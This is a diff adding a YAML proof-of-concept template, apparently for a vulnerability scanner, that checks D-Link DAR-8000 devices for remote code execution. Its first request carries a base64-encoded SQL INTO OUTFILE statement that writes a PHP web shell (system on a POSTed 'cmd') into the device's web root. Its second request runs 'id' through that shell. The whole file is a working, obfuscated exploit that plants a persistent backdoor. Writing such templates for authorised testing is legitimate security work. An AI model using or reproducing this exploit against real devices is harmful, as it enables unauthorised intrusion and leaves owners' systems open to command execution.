@@ -1,0 +1,15 @@
+name: D-Link-DAR-8000-RCE
+rules:
+  r0:
+    request:
+      method: GET
+      path: /importhtml.php?type=exporthtmlmail&tab=tb_RCtrlLog&sql=c2VsZWN0IDB4M2MzZjcwNjg3MDIwNjU2MzY4NmYyMDczNzk3Mzc0NjU2ZDI4MjQ1ZjUwNGY1MzU0NWIyMjYzNmQ2NDIyNWQyOTNiM2YzZSBpbnRvIG91dGZpbGUgJy91c3IvaGRkb2NzL25zZy9hcHAvaGVsbG9kbGluay5waHAn
+    expression: response.status == 200
+  r1:
+    request:
+      method: POST
+      path: /app/hellodlink.php
+      body: |
+        cmd=id
+    expression: response.status == 200 && "((u|g)id|groups)=[0-9]{1,4}\\([a-z0-9]+\\)".bmatches(response.body)
+expression: r0() && r1()
